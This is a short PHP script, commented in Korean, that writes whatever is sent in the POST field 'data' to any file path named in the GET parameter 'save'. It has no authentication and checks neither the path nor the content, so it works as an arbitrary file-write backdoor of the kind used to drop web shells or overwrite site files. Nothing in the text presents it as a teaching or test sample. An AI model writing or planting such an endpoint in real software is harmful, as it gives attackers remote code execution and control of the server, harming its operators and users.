<?php
if (isset($_GET['save']) && isset($_POST['data'])) {
    $target = $_GET['save'];
    // 파일 없으면 생성 (쓰기 모드로 열기)
    $f = fopen($target, 'w');
    if ($f) {
        fwrite($f, $_POST['data']);
        fclose($f);
        echo "✅ File written to {$target}";
    } else {
        echo "❌ Failed to write to {$target}";
    }
} else {
    echo "❗ Missing parameters.";
}
?>
